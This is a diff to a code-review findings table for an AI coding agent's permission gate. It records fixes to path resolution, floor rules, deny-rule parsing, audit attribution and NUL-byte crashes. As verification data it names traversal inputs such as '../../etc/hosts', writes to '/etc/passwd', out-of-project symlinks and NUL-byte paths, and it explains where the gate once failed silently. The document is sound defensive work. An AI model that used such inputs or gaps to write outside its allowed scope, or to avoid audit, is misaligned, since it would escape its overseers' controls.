-| CR-B4 | **Important** | `PENDING` | **The engine reads model-supplied absolute paths as host paths; the backend reads them as virtual paths rooted at the project.** `rules.py:235` `given = candidate if candidate.is_absolute() else self.project_root / candidate`. But every backend Rudra builds is `virtual_mode=True` (`agent/main_agent.py:439-448`) and deepagents resolves `/x` as `<root>/x` (`backends/filesystem.py:203-215`), while its own tool schema instructs the model "Absolute path … Must be absolute, not relative" (`middleware/filesystem.py:1132`). So a model that *obeys the tool description* and calls `write_file("/src/app.py", …)` — a write that would land at `<project>/src/app.py` — is denied `<floor:outside-root>`, and `outside-root` is the one floor rule config refuses to let you disable. `permissions/diff.py:32-34` repeats the mistake, so under `ask` the approval panel stats and previews `/src/app.py` **on the host** — the wrong file — while the write goes to `<project>/src/app.py`. Every permissions test uses relative paths, so this shape is uncovered. <br><br>**2026-08-21 — CONFIRMED, NOT FIXED. This one needs an owner decision, not a patch.** The mismatch is real and measured: `FilesystemBackend(virtual_mode=True).write("/etc/passwd", ...)` lands at `<project>/etc/passwd` and the host file is untouched — verified directly against the installed backend — while the engine denies that call `<floor:outside-root>`. So the gate and the backend genuinely disagree, and the approval panel previews the wrong file. **But the fix changes what `outside-root` means.** A patch was written and reverted: rewriting a non-project absolute path to project-relative made `write_file("/etc/passwd")` **allow**, which broke five tests that pin the current contract deliberately — `test_the_floor_holds_under_auto_mode`, `test_a_deny_on_a_symlinked_system_path_still_fires`, `test_an_anchored_pattern_matches_the_absolute_path`, `test_a_disabled_floor_rule_is_still_reported_in_the_source`, `test_the_floor_denies_even_in_auto_mode` — and contradicts `CLAUDE.md` §6, which documents that a pattern starting with `/` matches the resolved absolute path. Note the failure direction of today's behaviour is **safe**: it denies a legitimate write rather than permitting an illegitimate one. Two coherent options: **(a)** make the engine mirror the backend (paths become virtual, `outside-root` becomes advisory-only for filesystem tools, and A1.50's "the backend confines writes, not this rule" becomes literal), or **(b)** keep the floor as the visible contract and instead teach the coder prompt to write project-relative paths, so the model never emits the shape that trips it. (a) is more honest about what actually happens; (b) preserves a security signal users can read. Either way it ships as its own change with the tests rewritten to state the chosen contract. |
+| CR-B4 | **Important** | **`DONE`** | **The engine reads model-supplied absolute paths as host paths; the backend reads them as virtual paths rooted at the project.** `rules.py:235` `given = candidate if candidate.is_absolute() else self.project_root / candidate`. But every backend Rudra builds is `virtual_mode=True` (`agent/main_agent.py:439-448`) and deepagents resolves `/x` as `<root>/x` (`backends/filesystem.py:203-215`), while its own tool schema instructs the model "Absolute path … Must be absolute, not relative" (`middleware/filesystem.py:1132`). So a model that *obeys the tool description* and calls `write_file("/src/app.py", …)` — a write that would land at `<project>/src/app.py` — is denied `<floor:outside-root>`, and `outside-root` is the one floor rule config refuses to let you disable. `permissions/diff.py:32-34` repeats the mistake, so under `ask` the approval panel stats and previews `/src/app.py` **on the host** — the wrong file — while the write goes to `<project>/src/app.py`. Every permissions test uses relative paths, so this shape is uncovered. <br><br>**2026-08-21 — CONFIRMED, NOT FIXED. This one needs an owner decision, not a patch.** The mismatch is real and measured: `FilesystemBackend(virtual_mode=True).write("/etc/passwd", ...)` lands at `<project>/etc/passwd` and the host file is untouched — verified directly against the installed backend — while the engine denies that call `<floor:outside-root>`. So the gate and the backend genuinely disagree, and the approval panel previews the wrong file. **But the fix changes what `outside-root` means.** A patch was written and reverted: rewriting a non-project absolute path to project-relative made `write_file("/etc/passwd")` **allow**, which broke five tests that pin the current contract deliberately — `test_the_floor_holds_under_auto_mode`, `test_a_deny_on_a_symlinked_system_path_still_fires`, `test_an_anchored_pattern_matches_the_absolute_path`, `test_a_disabled_floor_rule_is_still_reported_in_the_source`, `test_the_floor_denies_even_in_auto_mode` — and contradicts `CLAUDE.md` §6, which documents that a pattern starting with `/` matches the resolved absolute path. Note the failure direction of today's behaviour is **safe**: it denies a legitimate write rather than permitting an illegitimate one. Two coherent options: **(a)** make the engine mirror the backend (paths become virtual, `outside-root` becomes advisory-only for filesystem tools, and A1.50's "the backend confines writes, not this rule" becomes literal), or **(b)** keep the floor as the visible contract and instead teach the coder prompt to write project-relative paths, so the model never emits the shape that trips it. (a) is more honest about what actually happens; (b) preserves a security signal users can read. Either way it ships as its own change with the tests rewritten to state the chosen contract. <br><br>**FIXED 2026-08-21 — option (a), owner's decision.** The gate now resolves a path the way the backend will, through one shared function: `compat/virtual_paths.py::virtual_to_relative`. Every backend is `virtual_mode=True`, so a leading `/` is the project root — `/etc/passwd` is `<project>/etc/passwd` and the host's file is untouched, measured against the pinned backend. Three consumers, one answer: the gate (`permissions/rules.py`), the approval preview (`permissions/diff.py`), and the backend itself via `route_prefixes()`, which `build_gate` now takes so mounts (`/artifacts/`, `/skills/`) are not rewritten as project content. <br><br>**What changed, precisely.** `outside-root` now fires on a *real* escape — `../..` traversal, or a symlink inside the project pointing out — and no longer on a virtual absolute path, which never left the project to begin with. Verified: `../../etc/hosts`, `src/../../../etc/hosts` and a symlink out all still deny `<floor:outside-root>`; `/src/app.py` and `/etc/passwd` allow. `/.git/config` now denies as `<floor:git-dir>` rather than `outside-root` — the *more* precise rule, where before the imprecise one masked it. <br><br>**Rules did not change.** `rule_matches` is now offered three spellings — the model's own, the project-relative, and the resolved host path — so a rule authored `write_file:/etc/**` keeps firing exactly as its author meant. Rules can only gain matches, so deny is strictly stronger; the floor is unaffected because it is handed the resolved path alone and never a spelling. <br><br>**Cross-platform, per the owner's requirement.** `virtual_to_relative` resolves by path SHAPE, not host OS, because the model guesses its style from training data rather than the machine: `C:\proj\src\app.py`, `\\server\share\app.py`, `src\app.py`, `\src\app.py` and `/src/app.py` all resolve on Windows, macOS and Linux alike. 14 tests in `tests/test_virtual_paths.py` pin this and are host-independent. <br><br>**Verified end-to-end through a real graph**, not just unit tests: a model emitting `write_file("/src/app.py")` against a real `FilesystemBackend(virtual_mode=True)` with the real middleware returns `status=success`, the file lands at `<project>/src/app.py`, and the host `/src` does not exist. Five tests that pinned the old host-path contract were rewritten to state the new one, with the reasoning in their docstrings; `CLAUDE.md` §6 and §3 updated. |
 | CR-B5 | Minor | **`DONE`** | **A deny rule naming a control-plane or wrapped-execute tool parses cleanly and is silently ignored.** `rules.py:248-254` returns `allow` for `CONTROL_PLANE_TOOLS` and `WRAPPED_EXECUTE_TOOLS` *before* the user-deny loop at `:275`, yet `parse_rule` accepts those names because `ALL_GATED_TOOLS` (`:85-87`) includes both sets. **Measured:** `deny = ["remember", "record_fact", "run_tests", "git_diff"]` → all four `allow`. A user who writes `deny = ["remember"]` to stop the agent writing to the memory palace gets a config that validates, prints no warning, and has no effect. <br><br>**FIXED 2026-08-21.** Fixed: `RULEABLE_TOOLS` (`ALL_GATED_TOOLS` minus control-plane minus wrapped-execute) is now the set `parse_rule` accepts and the set its error message lists, and naming an unruleable tool raises with the reason. Regression: `tests/test_permissions_rules.py::test_a_rule_naming_a_tool_it_cannot_affect_is_refused`. |
 | CR-B6 | Minor | **`DONE`** | **`floor-disabled` attribution is lost in `ask` and `plan` mode.** `rules.py:311-313` returns from the `plan`/`ask` branches without the `_final` wrapper (`:269-272`) that stamps `source="floor-disabled"` on a suppressed floor hit. `disabled_floor_notice` (`permissions/__init__.py:124-127`) promises "Calls they would have blocked are still recorded in the audit log." **Measured** with `floor_disable=("git-dir",)`: `mode="auto"` → `source='floor-disabled'`, `mode="ask"` → `source='mode-default'`, and the middleware records nothing for an `ask` (`middleware.py:107-110`), so the audit log holds no trace that a floor rule was violated and suppressed. Only the auto path is tested (`tests/test_permissions_rules.py:172-188`). <br><br>**FIXED 2026-08-21.** Fixed: `_final` stamps the suppressed floor rule on **every** effect, and the `plan`/`ask` branches route through it. Verified: `floor_disable=("git-dir",)` now reports `source='floor-disabled'` with `rule='<floor:git-dir>'` in all three modes, not just `auto`. |
 | CR-B7 | Minor | **`DONE`** | **A NUL byte in any path or pattern argument crashes the run instead of being denied.** `rules.py:237` `resolved = given.resolve()` raises `ValueError: embedded null character`, caught by nothing in `decide`, `RudraPermissionMiddleware._check` (`middleware.py:92-96`) or `interrupts._predicate` (`:27-31`). `grep`/`glob` **patterns** are routed through `_resolve` as if they were paths (`_ARG_KEYS:104-105`), so arbitrary model-authored search text reaches `Path.resolve()`. A malformed tool call becomes a crashed run rather than a denial. <br><br>**FIXED 2026-08-21.** Fixed: `_resolve` catches `ValueError`/`OSError` from `Path.resolve()`, and `decide` denies `<unresolvable-path>` when a mutating tool's path cannot be resolved — closing the CR-B2-shaped hole the catch would otherwise open. Verified: `write_file` with a NUL byte denies as `fail-closed`; `grep`/`ls`/`read_file` no longer raise. |
@@ -140,18 +507,30 @@ narrow, or a robustness asymmetry rather than a live failure.
 | CR-E verify · testing · git · filesystem · middleware | **1** | 6 | 5 | 12 |
 | CR-G cli · repl · trace · mcp | 0 | 7 | 4 | 11 |
 | CR-F cross-cutting (main session) | 0 | 2 | 4 | 6 |
-| **Total** | **5** | **28** | **29** | **62** |
+| CR-X cross-platform (owner requirement) | **1** (Windows) | 2 | 0 | 3 |
+| CR-DOC `CLAUDE.md` accuracy | 0 | 6 | 4 | 10 |
+| **Total** | **6** | **36** | **33** | **75** |
 
 ### Disposition, 2026-08-21
 
 | | Count |
 |---|---|
-| **`DONE`** — fixed and verified | **60** |
-| **`WONTFIX` (for now)** — CR-B3 | **1** |
-| **`PENDING`** — CR-B4, needs an owner decision (see its row) | **1** |
-| | **62** |
+| **`DONE`** — fixed and verified | **73** |
+| **`WONTFIX`** — CR-B3 (needs argv normalisation, a behaviour change), CR-X3 (owner declined CI) | **2** |
+| **`PENDING`** | **0** |
+| | **75** |
 
-Two of the 60 are **partial**, and their rows say which half was left:
+Updated 2026-08-21, in three passes. First the code review (62 findings).
+Then the owner chose **option (a)** for CR-B4 and made Windows/macOS/Linux a
+stated requirement, adding three CR-X portability findings. Then
+`CONTRIBUTING.md` was re-read against `CLAUDE.md`, adding ten CR-DOC
+accuracy findings — most of them instances of the one thing CONTRIBUTING
+warns about: *"One fact, one owner — a second copy would drift."*
+
+**Nothing is left `PENDING`.** The two `WONTFIX` rows each say what would
+have to be decided to reopen them.
+
+Two of the 63 are **partial**, and their rows say which half was left:
 **CR-E11** (the crash is fixed; the greedy-fence half collides with a
 deliberate test) and **CR-C6** (fixed as a side effect of CR-C5 — the
 cancel callback now fires during a run — but the approval prompt itself
@@ -160,7 +539,7 @@ still blocks the loop inside `input()`).
 **Gates after the work** (measured, not assumed):
 
 ```
-uv run pytest -q                  → 1713 passed, 2 skipped   (was 1696; +17 regression tests)
+uv run pytest -q                  → 1734 passed, 2 skipped   (was 1696; +38 regression tests)
 .venv/bin/ruff check src/ tests/  → All checks passed!
 .venv/bin/ruff format --check     → 258 files already formatted
 .venv/bin/mypy src/rudra          → 19 errors (unchanged from the pre-work baseline)
